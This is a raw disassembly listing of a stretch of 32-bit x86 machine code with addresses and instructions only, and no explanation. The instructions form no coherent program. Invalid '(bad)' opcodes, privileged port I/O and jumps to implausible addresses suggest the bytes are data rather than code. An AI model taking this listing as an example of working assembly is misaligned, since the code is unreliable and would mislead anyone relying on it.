  41813d:	int    0xd7
  41813f:	js     0x41814f
  418141:	inc    edx
  418142:	cmc    
  418143:	call   0xb3a385ae
  418148:	sbb    BYTE PTR [ebx-0xd00ab90],ah
  41814e:	jge    0x418177
  418150:	pop    DWORD PTR [edi+0x7103ae44]
  418156:	mov    esp,DWORD PTR [ebx]
  418158:	lahf   
  418159:	pusha  
  41815a:	mov    ds:0x8ee35ea8,al
  41815f:	imul   eax,DWORD PTR [eax+esi*2+0x41],0xec86e8a4
  418167:	out    dx,al
  418168:	jmp    0x777b:0x278f1007
  41816f:	jecxz  0x41810b
  418171:	inc    ebp
  418172:	cli    
  418173:	jmp    0x3e78703f
  418178:	int    0x91
  41817a:	(bad)
  41817d:	or     ecx,DWORD PTR [ebx+0x5c97261b]
  418183:	dec    edi
  418184:	mov    bh,0x7c
  418186:	xor    al,0x45
  418188:	cmp    dh,BYTE PTR [ebp-0x3f]
  41818b:	cmc    
  41818c:	or     DWORD PTR [edi-0x3e8e188a],0xf15e3ae7
  418196:	cmp    eax,0x26b6d38a
  41819b:	cmp    ch,al
  41819d:	leave  
  41819e:	retf   0xa515
  4181a1:	add    DWORD PTR ds:0x1031bdc2,edx
  4181a7:	test   DWORD PTR [eax],edi
  4181a9:	aad    0xf
  4181ab:	add    ecx,DWORD PTR [esi]
  4181ad:	jmp    DWORD PTR [ebp+0x577c443]
  4181b3:	enter  0x73da,0x4e
  4181b7:	xchg   edx,eax
  4181b8:	lods   eax,DWORD PTR ds:[esi]
  4181b9:	cmp    edi,ebp
  4181bb:	in     eax,0x1
  4181bd:	mov    dl,BYTE PTR [edi+0x62]
  4181c0:	adc    BYTE PTR [esi],cl
  4181c2:	sbb    al,0xf8
  4181c4:	rol    DWORD PTR [ecx+ebx*2-0x64],1
  4181c8:	dec    eax
  4181c9:	push   ebp
  4181ca:	xor    eax,0x5d6fd9cf
  4181cf:	ss and eax,0x1c2ac25f
  4181d5:	or     al,0x8f
  4181d7:	fsubr  st(4),st
  4181d9:	mov    esi,0x73374f87
  4181de:	adc    BYTE PTR [edx+0x4594366d],0xc8
  4181e5:	xlat   BYTE PTR ds:[ebx]
  4181e6:	push   0x50a268ca
  4181eb:	sti    
  4181ec:	inc    edi
  4181ed:	ret    
  4181ee:	jecxz  0x41817e
  4181f0:	cmp    al,dl
  4181f2:	cmp    ah,ch
  4181f4:	lods   al,BYTE PTR ds:[esi]
  4181f5:	sti    
  4181f6:	inc    al
  4181f8:	ror    dh,cl
  4181fa:	(bad)  
  4181fb:	mov    ebp,0xec18c58c
  418200:	mov    bl,0xaa
  418202:	mov    dh,0x78
  418204:	mov    ecx,0xf85df754
  418209:	arpl   WORD PTR [ecx+0xf74dc56],bp
  41820f:	sbb    eax,0x61221ff2
  418214:	ss inc edi
  418216:	aad    0xc7
  418218:	imul   ebp,DWORD PTR [eax-0x13],0x1b6d3569
  41821f:	mov    bl,0xb2
  418221:	pop    ds
  418222:	xchg   BYTE PTR [eax-0x6f5b21b4],cl
  418228:	mov    ds:0xb49de7d2,al
  41822d:	and    eax,0xa6860623
  418232:	mov    BYTE PTR [ecx],0x95
  418235:	ds test eax,0xc755854d
  41823b:	sbb    cl,bl
  41823d:	dec    esi
  41823e:	jo     0x418204
  418240:	inc    eax
  418241:	out    dx,al
  418242:	xor    ebx,DWORD PTR [edi]
  418244:	ss cdq 
  418246:	mov    cl,0x83
  418248:	adc    eax,0xc91c8853
  41824d:	mov    ebx,0x64b16ef
  418252:	xor    ah,BYTE PTR [edi]
  418254:	sti    
  418255:	cld    
  418256:	xchg   ebx,eax
  418257:	pop    ebx
  418258:	adc    edi,DWORD PTR [edx]
  41825a:	lahf   
  41825b:	sub    bl,BYTE PTR [edi+0x138bb16]
  418261:	jp     0x4182a5
  418263:	jmp    0xb9ddc4ae
  418268:	mov    ah,BYTE PTR ds:0x3ee2b41c
  41826e:	loope  0x418281
  418270:	scas   eax,DWORD PTR es:[edi]
  418271:	jge    0x418285
  418273:	xchg   ebp,eax
  418274:	push   esp
  418275:	retf   
  418276:	mov    ds:0x4359f484,al
  41827b:	rol    ch,0x75
  41827e:	mov    al,0x6c
  418280:	sub    ebx,DWORD PTR [edi+0x40]
  418283:	sub    DWORD PTR [edi],esp
  418285:	call   0x3eb28c33
  41828a:	cmp    ch,0xf4
  41828d:	ficomp WORD PTR [esi-0x1adc9a80]
  418293:	scas   eax,DWORD PTR es:[edi]
  418294:	or     edx,0xffffffef
  418297:	dec    esp
  418298:	xchg   DWORD PTR [esi+edx*8-0x3a],edi
  41829c:	mov    dh,BYTE PTR [eax-0x4c2a382]
  4182a2:	mov    es,WORD PTR [edi-0x25]
  4182a5:	dec    ebp
  4182a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182a7:	es stc 
  4182a9:	aaa    
  4182aa:	and    al,0xa6
  4182ac:	ins    DWORD PTR es:[edi],dx
  4182ad:	lods   al,BYTE PTR ds:[esi]
  4182ae:	xlat   BYTE PTR ds:[ebx]
  4182af:	and    al,ch
  4182b1:	aad    0xeb
  4182b3:	cli    
  4182b4:	fidivr WORD PTR [ebx+ebx*1-0x3e]
  4182b8:	xchg   esp,eax
  4182b9:	sbb    DWORD PTR [edx+ebp*2],ebx
  4182bc:	cmp    dl,dh
  4182be:	js     0x41832e
  4182c0:	movd   DWORD PTR [eax],mm5
  4182c3:	ja     0x418292
  4182c5:	dec    ebx
  4182c6:	add    esi,ecx
  4182c8:	add    ch,ch
  4182ca:	sbb    eax,0xff65961f
  4182cf:	push   ss
  4182d0:	call   0x3fba422d
  4182d5:	mov    edx,DWORD PTR [edx+0x27]
  4182d8:	jecxz  0x418350
  4182da:	xor    BYTE PTR [edi],dh
  4182dc:	jle    0x418350
  4182de:	or     BYTE PTR [ebx+0x4c],dl
  4182e1:	cmc    
  4182e2:	mov    dl,0x2
  4182e4:	and    eax,0xdb978bc2
  4182e9:	xor    dl,BYTE PTR [edi*8-0x783928f7]
  4182f0:	xor    edi,DWORD PTR [ebp+0x7cba1373]
  4182f6:	in     eax,0x3a
  4182f8:	adc    al,0xb4
  4182fa:	scas   al,BYTE PTR es:[edi]
  4182fb:	cmp    edi,edi
  4182fd:	pop    edi
  4182fe:	and    bl,BYTE PTR [ebx]
  418300:	mov    dh,0xb7
  418302:	xor    al,0x39
  418304:	add    bh,BYTE PTR [esp+ecx*2]
  418307:	push   ss
  418308:	(bad)  
  418309:	fucom  st(3)
  41830b:	sbb    eax,0xd44a9ea3
  418310:	pop    edx
  418311:	test   eax,0xb366661c
  418316:	out    0x80,al
  418318:	or     DWORD PTR [edi-0x4df77c6c],eax
  41831e:	outs   dx,BYTE PTR ds:[esi]
  41831f:	rol    BYTE PTR [edx-0x5a0beeaf],1
  418325:	mov    ds:0x57ca21f4,eax
  41832a:	imul   ebx,ebx,0x3a24ad03
  418330:	shl    DWORD PTR [ecx+0x67],1
  418333:	jmp    0x18fa:0x84e54ae4
  41833a:	lock push ecx
  41833c:	mov    bl,0xa8
  41833e:	and    eax,0x559127a5
  418343:	mov    gs,WORD PTR [esp+edi*4-0x41]
  418347:	sbb    DWORD PTR [ebp+0x7b],esp
  41834a:	xor    al,0xc
  41834c:	inc    eax
  41834d:	out    dx,al
  41834e:	lds    esi,FWORD PTR [ebx+ebp*1+0x3c]
  418352:	sub    eax,0x6ac4cb41
  418357:	loopne 0x4182f9
  418359:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41835a:	scas   al,BYTE PTR es:[edi]
  41835b:	stos   BYTE PTR es:[edi],al
  41835c:	retf   0x5822
  41835f:	push   ebp
  418360:	and    ecx,ecx
  418362:	(bad)  [esi+0x375b83c1]
  418368:	out    0x97,eax
  41836a:	sub    eax,0x640e7dba
  41836f:	pop    ebx
  418370:	dec    eax
  418371:	jb     0x418381
  418373:	push   edx
  418374:	cs push eax
  418376:	mov    ds:0x9b173185,eax
  41837b:	fidiv  DWORD PTR ds:0x1ec4385b
  418381:	push   esp
  418382:	xor    ecx,DWORD PTR [ebx-0x15104ca3]
  418388:	xor    eax,0x853f5434
  41838d:	leave  
  41838e:	dec    edx
  41838f:	aas    
  418390:	xlat   BYTE PTR ds:[ebx]
  418391:	jbe    0x418389
  418393:	dec    ecx
  418394:	(bad)  
  418395:	fstp   DWORD PTR [ebx-0x14]
  418398:	sar    DWORD PTR [ebx+0x7c],0x62
  41839c:	and    bl,BYTE PTR [ebp+0x23]
  41839f:	jae    0x418415
  4183a1:	push   edi
  4183a2:	inc    esi
  4183a3:	mov    ebx,0x3244ed0b
  4183a8:	mov    eax,ds:0x629469d2
  4183ad:	push   es
  4183ae:	and    BYTE PTR [edi+0x1a],ah
  4183b1:	jae    0x4183b5
  4183b3:	mov    bh,0x17
  4183b5:	lea    esi,[edi]
  4183b7:	xor    edx,0xffffffde
  4183ba:	scas   eax,DWORD PTR es:[edi]
  4183bb:	(bad)  
  4183bc:	adc    al,0x9f
  4183be:	ds popf 
  4183c0:	jae    0x418414
  4183c2:	add    edi,edx
  4183c4:	xchg   edi,eax
  4183c5:	call   0xf5aca2b6
  4183ca:	push   es
  4183cb:	std    
  4183cc:	mov    ebx,0xdc9386b
  4183d1:	pop    ds
  4183d2:	cmp    cl,BYTE PTR [ebp-0x11213fa1]
  4183d8:	dec    esi
  4183d9:	je     0x418448
  4183db:	mov    al,ds:0x9dfb98ed
  4183e0:	jp     0x418377
  4183e2:	daa    
  4183e3:	mov    dl,0x26
  4183e5:	cmp    ah,BYTE PTR [ecx+0x2d]
  4183e8:	mov    eax,0x690e9a80
  4183ed:	cs adc al,0x2b
  4183f0:	ins    BYTE PTR es:[edi],dx
  4183f1:	mov    ch,0x68
  4183f3:	test   BYTE PTR [esi+ebx*2],dl
  4183f6:	lock fiadd DWORD PTR [ebx+0x5db3a14b]
  4183fd:	mov    ds:0xcde56ffa,al
  418402:	imul   DWORD PTR [edx]
  418404:	jno    0x4183de
  418406:	aad    0x1b
  418408:	fldenv [eax+0x3326ba04]
  41840e:	mov    ss,WORD PTR [edx+0x5fca0b33]
  418414:	sbb    ebx,DWORD PTR [edx]
  418416:	sti    
  418417:	mov    DWORD PTR [esp+ecx*8-0x34],edx
  41841b:	sahf   
  41841c:	jge    0x41843b
  41841e:	or     ebp,edi
  418420:	retf   
  418421:	lahf   
  418422:	pop    ss
  418423:	or     edx,DWORD PTR ds:0x69b0a891
  418429:	cmp    al,0xaa
  41842b:	xchg   ecx,eax
  41842c:	arpl   WORD PTR [esi+edx*8],cx
  41842f:	mov    bl,0x72
  418431:	inc    edi
  418432:	mov    edx,0xce3a16aa
  418437:	inc    esi
  418438:	mov    al,ah
  41843a:	mov    eax,0xc28bae9
  41843f:	outs   dx,DWORD PTR ds:[esi]
  418440:	in     al,0x36
  418442:	add    eax,0x31aeaa30
  418447:	ins    BYTE PTR es:[edi],dx
  418448:	cmp    DWORD PTR [edx-0x1be1ed60],edi
  41844e:	sbb    BYTE PTR ds:0x2bd185e0,cl
  418454:	test   eax,0x3c2800d
  418459:	repnz mov ah,0xa4
  41845c:	add    al,0xe7
  41845e:	mov    dh,0x4b
  418460:	aas    
  418461:	data16 cmp ch,BYTE PTR [eax+ebp*8+0x7c]
  418466:	push   cs
  418467:	sub    esi,edi
  418469:	or     esi,esp
  41846b:	mov    eax,ds:0xdac6c374
  418470:	stos   BYTE PTR es:[edi],al
  418471:	fdivr  QWORD PTR [esi]
  418473:	nop
  418474:	push   cs
  418475:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418476:	mov    ch,0x7b
  418478:	ins    DWORD PTR es:[edi],dx
  418479:	adc    BYTE PTR [ebx],0x65
  41847c:	stc    
  41847d:	pop    esp
  41847e:	or     DWORD PTR [edx-0x3b],0xffffffd5
  418482:	out    0x82,al
  418484:	xor    eax,0xaa207df6
  418489:	loope  0x4184ff
  41848b:	add    bh,dh
  41848d:	mov    ecx,0x5d7a99d1
  418492:	sti    
  418493:	mov    cl,0x3b
  418495:	in     al,0xca
  418497:	push   0xfa50e3d4
  41849c:	and    BYTE PTR [ecx-0x10b50040],bh
  4184a2:	xor    BYTE PTR [esi],bh
  4184a4:	inc    esp
  4184a5:	sub    BYTE PTR [edx],ah
  4184a7:	mov    ebx,0x2603b34a
  4184ac:	sub    al,0xd8
  4184ae:	outs   dx,DWORD PTR ds:[esi]
  4184af:	xor    ecx,ecx
  4184b1:	or     al,BYTE PTR ds:0x32f1acf8
  4184b7:	or     DWORD PTR [edi+0x74],0xf349c134
  4184be:	aam    0x95
  4184c0:	pop    ecx
  4184c1:	mov    bh,0x73
  4184c3:	and    edi,eax
  4184c5:	sahf   
  4184c6:	pop    esp
  4184c7:	mov    cl,0x15
  4184c9:	cmp    bl,BYTE PTR [esi+esi*2-0x6156afa9]
  4184d0:	inc    esp
  4184d1:	add    BYTE PTR [edx+edx*2-0x6e],dh
  4184d5:	frstor [ebx+esi*8-0x278f6e10]
  4184dc:	mov    dh,0xac
  4184de:	and    DWORD PTR [ebp+0x594af8e3],ebp
  4184e4:	jno    0x41853e
  4184e6:	jecxz  0x41846c
  4184e8:	into   
  4184e9:	sub    BYTE PTR [ecx],cl
  4184eb:	xlat   BYTE PTR ds:[ebx]
  4184ec:	jno    0x41854b
  4184ee:	mov    ebp,DWORD PTR [edi+ebx*2-0x4111eb8f]
  4184f5:	es popf 
  4184f7:	sub    DWORD PTR [edx],edx
  4184f9:	mov    ebp,0xa31584ee
  4184fe:	mov    ah,0x4
  418500:	pop    es
  418501:	xchg   DWORD PTR [ecx-0x35],ebp
  418504:	jne    0x41848a
  418506:	mov    dl,0xa7
  418508:	in     eax,0x67
  41850a:	iret   
  41850b:	mov    edx,0x4f03e20f
  418510:	and    al,0x48
  418512:	mov    eax,0xa583f56b
  418517:	int    0x7f
  418519:	mov    dl,0xdb
  41851b:	in     eax,dx
  41851c:	xor    al,BYTE PTR [ecx+0x5bcff5b0]
  418522:	xor    DWORD PTR [eax-0x13],esi
  418525:	js     0x418532
  418527:	mov    dh,0x74
  418529:	into   
  41852a:	sub    al,0x14
  41852c:	xor    DWORD PTR [edx],edi
  41852e:	iret   
  41852f:	int3   
  418530:	ss sahf 
  418532:	into   
  418533:	dec    ebp
  418534:	iret   
  418535:	dec    ebp
  418536:	dec    esi
  418537:	sbb    al,BYTE PTR [edx]
  418539:	adc    ebp,DWORD PTR [ecx+0x352b6004]
  41853f:	test   BYTE PTR [ebx+edx*2+0x29],bh
  418543:	add    DWORD PTR [eax-0x5],edi
  418546:	mov    bl,0x2e
  418548:	aad    0x8
  41854a:	sbb    al,0x9e
  41854c:	imul   ecx,DWORD PTR [ebx+eax*2],0xffffffd9
  418550:	repnz add eax,0x5d73eaea
  418556:	sub    al,0xba
  418558:	fcom   QWORD PTR [ebx-0x662fe807]
  41855e:	dec    ebp
  41855f:	mov    eax,ds:0x8764eea4
  418564:	inc    ecx
  418565:	or     ah,BYTE PTR [ebp*4-0x32de271c]
  41856c:	mov    eax,ds:0x4a10af66
  418571:	cdq    
  418572:	xchg   DWORD PTR ss:[ecx],ebx
  418575:	jp     0x41858d
  418577:	or     al,0xe2
  418579:	pop    ds
  41857a:	loop   0x41852d
  41857c:	pop    ebx
  41857d:	add    al,0x8e
  41857f:	pushf  
  418580:	inc    eax
  418581:	sbb    eax,0x59933521
  418586:	mov    ah,0xec
  418588:	fucomip st,st(7)
  41858a:	mov    edi,0x36129efc
  41858f:	xchg   edi,eax
  418590:	mov    edx,0xf70baa56
  418595:	test   BYTE PTR [edx-0xd],bl
  418598:	(bad)  
  418599:	ss dec esi
  41859b:	cld    
  41859c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41859d:	push   edx
  41859e:	stc    
  41859f:	lock or ecx,ebp
  4185a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4185a3:	push   ebx
  4185a4:	or     al,0x2b
  4185a6:	out    dx,al
  4185a7:	add    eax,0xca86f713
  4185ac:	scas   eax,DWORD PTR es:[edi]
  4185ad:	jmp    0x6b456ac8
  4185b2:	jmp    0x5884c3b2
  4185b7:	stos   DWORD PTR es:[edi],eax
  4185b8:	push   edx
  4185b9:	xchg   esp,eax
  4185ba:	mov    ch,0x25
  4185bc:	ret    0xa61c
  4185bf:	push   eax
  4185c0:	mov    edx,DWORD PTR [ebp+0x48e596ee]
  4185c6:	aaa    
  4185c7:	cmp    ah,BYTE PTR [ebp-0x1d]
  4185ca:	mov    esi,esp
  4185cc:	push   eax
  4185cd:	inc    ebx
  4185ce:	mov    ah,0x3e
  4185d0:	mov    eax,ds:0x518b3032
  4185d5:	jl     0x418586
  4185d7:	jo     0x41863b
  4185d9:	dec    ecx
  4185da:	sub    DWORD PTR [ecx+0x527d1d21],0x1963a9e3
  4185e4:	dec    ebx
  4185e5:	jmp    0x41862e
  4185e7:	test   al,0xcc
  4185e9:	jne    0x418652
  4185eb:	add    ebx,edx
  4185ed:	aam    0x7c
  4185ef:	add    al,0xed
  4185f1:	xchg   edi,eax
  4185f2:	lods   eax,DWORD PTR ds:[esi]
  4185f3:	call   0xa4c6:0x58b9294b
  4185fa:	xor    al,0x51
  4185fc:	mov    dl,0x62
  4185fe:	mov    eax,ds:0xf0318fad
  418603:	fs in  al,dx
  418605:	jmp    0x7cde59a
  41860a:	cmp    BYTE PTR [eax],0xe3
  41860d:	xor    edi,DWORD PTR [edi-0x3c9a93c1]
  418613:	jo     0x41866d
  418615:	int3   
  418616:	ss std 
  418618:	loope  0x41862e
  41861a:	mov    WORD PTR [esi-0x35472a87],es
  418620:	adc    cl,BYTE PTR [eax+0x61]
  418623:	dec    eax
  418624:	scas   al,BYTE PTR es:[edi]
  418625:	(bad)  
  418626:	dec    edx
  418627:	dec    ebx
  418628:	fs push 0xffffff8c
  41862b:	inc    eax
  41862c:	sub    esi,DWORD PTR [edi+0x7a63c447]
  418632:	out    dx,al
  418633:	dec    BYTE PTR [esi-0x27]
  418636:	dec    eax
  418637:	mov    ds:0x618d74c1,eax
  41863c:	imul   ebp,DWORD PTR [esi+0x2e],0xb
  418640:	outs   dx,BYTE PTR ds:[esi]
  418641:	les    ecx,FWORD PTR [eax+ecx*8+0x3b]
  418645:	sbb    DWORD PTR [ebp+0x1e],edx
  418648:	cmp    DWORD PTR [ecx-0x14],esp
  41864b:	mov    ds:0xa7a4028d,eax
  418650:	dec    ebx
  418651:	cmp    ah,BYTE PTR [esi+0x5b]
  418654:	arpl   di,bx
  418656:	adc    edi,DWORD PTR [esi]
  418658:	sub    al,0x27
  41865a:	mov    eax,ebx
  41865c:	fistp  WORD PTR [edi+0x49]
  41865f:	mov    ebp,0x62905882
  418664:	add    BYTE PTR [edi+0x2],cl
  418667:	cmp    ah,BYTE PTR [ebp+esi*8+0x7e]
  41866b:	pop    ebx
  41866c:	xchg   BYTE PTR [esi-0x682a5499],ch
  418672:	xchg   esp,eax
  418673:	cs sub al,0x9b
  418676:	xor    DWORD PTR [edi-0xea9b0df],esi
  41867c:	in     al,0x5
  41867e:	pop    edi
  41867f:	movnti DWORD PTR [esi-0x4862eb8],edx
  418686:	jg     0x418668
  418688:	cmc    
  418689:	inc    esp
  41868a:	push   esp
  41868b:	mov    ecx,0xb251556c
  418690:	aad    0xe4
  418692:	jbe    0x4186ce
  418694:	sbb    bh,cl
  418696:	sahf   
  418697:	cmp    BYTE PTR [edx-0x1c],dh
  41869a:	and    al,0x6a
  41869c:	mov    BYTE PTR [eax],bh
  41869e:	ins    BYTE PTR es:[edi],dx
  41869f:	clc    
  4186a0:	mov    al,0x2d
  4186a2:	inc    ecx
  4186a3:	sub    al,0x39
  4186a5:	sub    al,0x94
  4186a7:	dec    edi
  4186a8:	je     0x41868e
  4186aa:	fs into 
  4186ac:	mov    edi,0x90ff2c14
  4186b1:	pop    ebx
  4186b2:	push   cs
  4186b3:	xchg   ebp,eax
  4186b4:	outs   dx,BYTE PTR ds:[esi]
  4186b5:	push   ebx
  4186b6:	sub    BYTE PTR [esi+0x52],al
  4186b9:	jne    0x41869d
  4186bb:	pop    ecx
  4186bc:	mov    ebp,0x4528ba3f
  4186c1:	xchg   DWORD PTR [ebx+0xb],ebp
  4186c4:	ffree  st(5)
  4186c6:	dec    ebx
  4186c7:	stos   DWORD PTR es:[edi],eax
  4186c8:	xor    ebp,DWORD PTR [ecx+esi*2]
  4186cb:	xor    esp,DWORD PTR [ecx]
  4186cd:	push   ebp
  4186ce:	mov    edx,0x76431f
  4186d3:	cmp    ch,BYTE PTR [edi]
  4186d5:	or     ah,dh
  4186d7:	push   esi
  4186d8:	or     al,0x18
  4186da:	test   al,0x73
  4186dc:	retf   0xe7f7
  4186df:	sar    DWORD PTR [ecx],1
  4186e1:	pop    esi
  4186e2:	iret   
  4186e3:	xchg   esi,eax
  4186e4:	xor    DWORD PTR [ebp-0x249bf3fd],esp
  4186ea:	inc    ecx
  4186eb:	and    DWORD PTR [edx+eiz*4],edx
  4186ee:	cwde   
  4186ef:	dec    eax
  4186f0:	bound  esi,QWORD PTR [ecx+0xe898252]
  4186f6:	call   0x8ab13c1c
  4186fb:	pop    ebx
  4186fc:	cs loop 0x41871f
  4186ff:	sete   BYTE PTR [ecx+0x3e]
  418703:	push   edi
  418704:	mov    edi,0x63b2156d
  418709:	lahf   
  41870a:	test   al,0xfa
  41870c:	cld    
  41870d:	cmp    bl,ah
  41870f:	es jo  0x4186d7
  418712:	mov    edx,0xd06cc69
  418717:	outs   dx,DWORD PTR ds:[esi]
  418718:	cli    
  418719:	push   cs
  41871a:	mov    ds:0xdf50ac0e,eax
  41871f:	ja     0x418727
  418721:	push   0x7fd1cf63
  418726:	jle    0x418718
  418728:	not    DWORD PTR [ecx+0x34]
  41872b:	jno    0x4186fa
  41872d:	fsubr  st(5),st
  41872f:	push   esi
  418730:	xchg   edi,edi
  418732:	inc    ecx
  418733:	adc    esi,DWORD PTR ds:0xcb4a1657
  418739:	and    DWORD PTR [ebp+0x53],ebx
  41873c:	sub    dl,BYTE PTR [edi]
  41873e:	sbb    bl,BYTE PTR [edi+0x60]
  418741:	sub    DWORD PTR [ecx-0x1c9748bc],eax
  418747:	(bad)  
  418748:	xchg   esp,eax
  418749:	in     al,dx
  41874a:	sub    edx,DWORD PTR [esi+0x1]
  41874d:	add    BYTE PTR [ebx-0x4b50ec3b],0x9a
  418754:	dec    edi
  418755:	cli    
  418756:	loope  0x41874e
  418758:	inc    ecx
  418759:	das    
  41875a:	sbb    DWORD PTR [ebx],ebp
  41875c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41875d:	inc    eax
  41875e:	pop    ss
  41875f:	(bad)  
  418760:	xchg   ebx,esp
  418762:	outs   dx,BYTE PTR ds:[esi]
  418764:	lahf   
  418765:	stc    
  418766:	aas    
  418767:	pop    eax
  418768:	dec    ebp
  418769:	add    dl,ch
  41876b:	and    BYTE PTR [esi-0x6070539b],bh
  418771:	pop    eax
  418772:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418773:	push   ss
  418774:	xor    BYTE PTR [esi+ebp*8+0x3a],ch
  418778:	and    DWORD PTR [ebp-0x67],ebp
  41877b:	sub    BYTE PTR [edx-0x5d052845],0xa9
  418782:	retf   0x1aaf
  418785:	repnz push cs
  418787:	enter  0xe3b7,0x83
  41878b:	mov    ds:0x96edc3fd,al
  418790:	mov    eax,0x84570605
  418795:	jmp    0x1471:0x8fc601ab
  41879c:	stc    
  41879d:	fistp  DWORD PTR [edx-0x24e3694f]
  4187a3:	cmp    BYTE PTR [esi+0x1a58520e],al
  4187a9:	packuswb mm3,QWORD PTR [eax-0x22]
  4187ad:	xchg   esi,eax
  4187ae:	push   esp
  4187af:	sbb    eax,0xcf53a466
  4187b4:	in     eax,dx
  4187b5:	and    bh,BYTE PTR ds:0xe012b4ae
  4187bb:	inc    ebx
  4187bc:	loope  0x41883d
  4187be:	jae    0x418832
  4187c0:	adc    BYTE PTR [ebp+0x11],dh
  4187c3:	dec    eax
  4187c4:	and    BYTE PTR [esi+0x1],al
  4187c7:	push   esi
  4187c8:	sti    
  4187c9:	shl    BYTE PTR [di-0x27],cl
  4187cd:	stos   DWORD PTR es:[edi],eax
  4187ce:	popa   
  4187cf:	and    BYTE PTR [ecx],bh
  4187d1:	bound  ebp,QWORD PTR [ecx-0x42e0fb41]
  4187d7:	or     eax,0xecbfd7b8
  4187dc:	scas   eax,DWORD PTR es:[edi]
  4187dd:	push   ecx
  4187de:	icebp  
  4187df:	pop    ds
  4187e0:	add    BYTE PTR [edi+0x45f65edc],ch
  4187e6:	shr    DWORD PTR [edi-0x1d53b70f],1
  4187ec:	mov    dl,BYTE PTR [ebx]
  4187ee:	mov    ebp,0xece9427b
  4187f3:	or     al,0xb
  4187f5:	popf   
  4187f6:	mov    ah,0xc9
  4187f8:	jb     0x4187f1
  4187fa:	rol    BYTE PTR ds:0xbb3872f7,0xbc
  418801:	mov    al,0xf7
  418803:	add    eax,0xef6915ee
  418808:	lods   eax,DWORD PTR ds:[esi]
  418809:	into   
  41880a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41880b:	retf   0x752e
  41880e:	or     eax,0x17bf6728
  418813:	mov    WORD PTR [ebx-0xfdee1ff],?
  418819:	stc    
  41881a:	jnp    0x4187cc
  41881c:	aaa    
  41881d:	xchg   edi,eax
  41881e:	sub    al,0x74
  418820:	lock mov ds:0xfcf785f1,al
  418826:	sub    BYTE PTR [eax+0xa738bc2],dh
  41882c:	pop    ss
  41882d:	out    0x46,al
  41882f:	push   0x4108b619
  418834:	loope  0x4187d3
  418836:	adc    esp,ecx
  418838:	mov    BYTE PTR [ecx-0x703134a8],bl
  41883e:	jns    0x41884f
  418840:	(bad)  
  418841:	mov    esi,0x34f7f0bf
  418846:	ds push 0xadc52e2d
  41884c:	adc    edx,DWORD PTR [ecx-0x4a]
  41884f:	ss adc al,0x98
  418852:	cli    
  418853:	outs   dx,DWORD PTR ds:[esi]
  418854:	scas   al,BYTE PTR es:[edi]
  418855:	test   DWORD PTR [ebp-0x10b2e83],edi
  41885b:	jecxz  0x41886e
  41885d:	mov    al,ds:0x71dbbbd1
  418862:	mov    al,BYTE PTR [edx+0x38219c1d]
  418868:	jmp    0x5d1acc32
  41886d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41886e:	jg     0x418842
  418870:	sbb    dl,0xec
  418873:	sub    esi,DWORD PTR [esi]
  418875:	es dec ecx
  418877:	or     ecx,DWORD PTR [ecx-0x6d1f0f29]
  41887d:	sti    
  41887e:	adc    eax,0xabe670ef
  418883:	jns    0x41884d
  418885:	push   eax
  418886:	mov    dh,0x7c
  418888:	or     eax,0x357da48
  41888d:	aad    0xd6
  41888f:	clc    
  418890:	cmp    DWORD PTR [ebx-0x32],ebx
  418893:	ss xchg edi,eax
  418895:	adc    al,BYTE PTR [ebx-0x72]
  418898:	lock sbb al,0x2a
  41889b:	dec    bp
  41889d:	jg     0x4188df
  41889f:	adc    DWORD PTR [edx-0x5],ebp
  4188a2:	jns    0x418851
  4188a4:	fisub  DWORD PTR [ebp-0x5f]
  4188a7:	sbb    al,0x97
  4188a9:	cmp    DWORD PTR [ebx+edx*8-0x36],esp
  4188ad:	mov    eax,ds:0xac73fabc
  4188b2:	or     eax,0x7ed91984
  4188b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4188b8:	out    0xe7,al
  4188ba:	or     al,0xae
  4188bc:	sbb    ah,cl
  4188be:	addr16 mov esp,0x1138d6
  4188c4:	sbb    BYTE PTR [esi-0x54cce6d5],al
  4188ca:	imul   ebx,DWORD PTR [edi],0xffffffa2
  4188cd:	nop
  4188ce:	pop    esp
  4188cf:	retf   
  4188d0:	pop    eax
  4188d1:	enter  0x4c59,0xaa
  4188d5:	(bad)  
  4188d6:	dec    esp
  4188d7:	test   ebx,esp
  4188d9:	and    al,BYTE PTR [esi]
  4188db:	mov    cl,0x2e
  4188dd:	dec    ecx
  4188de:	adc    BYTE PTR [edi-0x4bc492e8],ah
  4188e4:	pop    ebx
  4188e5:	dec    esp
  4188e6:	or     BYTE PTR ds:0x85d008bd,ah
  4188ec:	lods   eax,DWORD PTR ds:[esi]
  4188ed:	inc    ecx
  4188ee:	test   ch,0x6
  4188f1:	or     BYTE PTR [ebx],bh
  4188f3:	dec    eax
  4188f4:	and    esp,ecx
  4188f6:	pop    eax
  4188f7:	repz push ds
  4188f9:	push   ebx
  4188fa:	mov    bh,0x4f
  4188fc:	aad    0xfc
  4188fe:	int    0x57
  418900:	xor    dl,bl
  418902:	fcom   QWORD PTR ds:0xd5556086
  418908:	repnz fst QWORD PTR [ecx+0x2fad60f8]
  41890f:	cmp    eax,0x541c0077
  418914:	sub    eax,0xc3e44dd0
  418919:	ja     0x41891f
  41891b:	add    eax,0xe5e4074
  418920:	les    ebx,FWORD PTR [edx+0x31c61360]
  418926:	stos   DWORD PTR es:[edi],eax
  418927:	int3   
  418928:	les    eax,FWORD PTR [edx+0x50eef124]
  41892e:	scas   eax,DWORD PTR es:[edi]
  41892f:	(bad)  [ebp+0x391c0879]
  418935:	xchg   esp,eax
  418936:	loop   0x4188ca
  418938:	add    bh,BYTE PTR [esi+0x690e13af]
  41893e:	fmul   QWORD PTR [edi]
  418940:	xor    dh,BYTE PTR [eax]
  418942:	repz fsubr DWORD PTR [edi+0x515f7762]
  418949:	add    eax,DWORD PTR [edi]
  41894b:	in     eax,dx
  41894c:	pop    es
  41894d:	push   ebx
  41894e:	imul   edx,DWORD PTR ds:0xa506c56,0x5a
  418955:	add    eax,0xdf590823
  41895a:	sbb    BYTE PTR [edx+0x6be85afc],dh
  418960:	push   esp
  418961:	cwde   
  418962:	lahf   
  418963:	mov    ecx,0x88bb95ec
